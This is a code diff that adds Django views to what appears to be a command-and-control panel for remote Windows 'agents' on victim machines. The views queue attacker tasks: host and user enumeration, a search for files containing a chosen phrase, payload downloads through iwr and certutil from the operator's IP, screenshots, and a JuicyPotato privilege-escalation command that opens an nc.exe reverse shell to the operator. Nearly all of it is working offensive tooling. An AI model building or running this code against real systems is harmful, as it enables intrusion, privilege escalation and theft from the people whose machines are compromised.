@@ -15,6 +15,7 @@ def DirectoryListing(request):
         with open(task_path, "w") as f:
             f.write(task)
             f.close()
+        return render(request, 'blog/payload-Gen.html' )
     else:
         return render(request, 'blog/listeners.html')
     # ls c:\users
@@ -27,5 +28,235 @@ def Applocker(request):
         with open(task_path, "w") as f:
             f.write(task)
             f.close()
+        return render(request, 'blog/payload-Gen.html' )
     else:
         return render(request, 'blog/listeners.html')
+    
+    
+
+def Download(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        url = request.POST['url']
+        outpath = request.POST['outpath']   
+        task = 'iwr -Uri {} -OutFile {}'.format(url, outpath)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def env_var(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============All environment variables===============";Get-ChildItem Env:'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def Phrase_finder(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        phrase = request.POST['phrase']
+        task = 'echo "===============All files contain "{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml'.format(phrase , phrase)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+    # ls c:\users
+
+
+
+def IPsWindows(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============Interface, IP address and DNS information===============";ipconfig /all; echo "===============arp table information===============";arp -a'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+
+def logged_users(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============Logged-in users===============";query user'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def Net_Connections(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============Network connections===============";netstat -ano'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def Programs(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============Installed programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version '
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+    
+    
+def processes(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============Running processes===============";tasklist /svc'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def ScreenShot(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        f = open("{}".format(current_path+"screenshot"), "rt")
+        task = f.read()
+        f.close()
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def user_info(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============Current user===============";whoami;echo "===============User Privileges===============";echo "If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM USE JuicyPotato of PrintSpoofer or RougePotato.";whoami /priv;echo "===============User group information===============";whoami /groups'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def Systeminfo(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============System-Info===============";systeminfo;echo "===============Get Password Policy & Other Account Information===============";net accounts;echo "===============All system users===============";net user;echo "===============All system groups===============";net localgroup'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+    
+    
+    
+
+
+def UpdatesWindows(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============Patches and Updates===============";wmic qfe;Get-HotFix | ft -AutoSize'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+    
+
+def UploadFileWindows(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        ip = request.POST['ip']
+        file_path = request.POST['file_path']
+        destination = request.POST['destination']
+        task = 'certutil.exe -urlcache -split -f http://{}:8000/{} {}'.format(ip,file_path,destination)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+    
+    
+    
+def WinDefStat(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============Windows Defender Status===============";Get-MpComputerStatus'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+
+def Named_pipes(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        task = 'echo "===============List named pipes===============";cmd;pipelist.exe /accepteula'
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+    
+
+def juicypotato (request):
+    if request.method=='POST':
+        myip = request.POST['myip']
+        agent = request.POST['agent']
+        listenport = request.POST['listenport']    
+        pathOfJuicyOnVictim = request.POST['pathOfJuicyOnVictim']
+        task = '{} -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe {} {} -e cmd.exe" -t *'.format(pathOfJuicyOnVictim,myip,listenport)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return render(request, 'blog/payload-Gen.html' )
+    else:
+        return render(request, 'blog/listeners.html')
+    
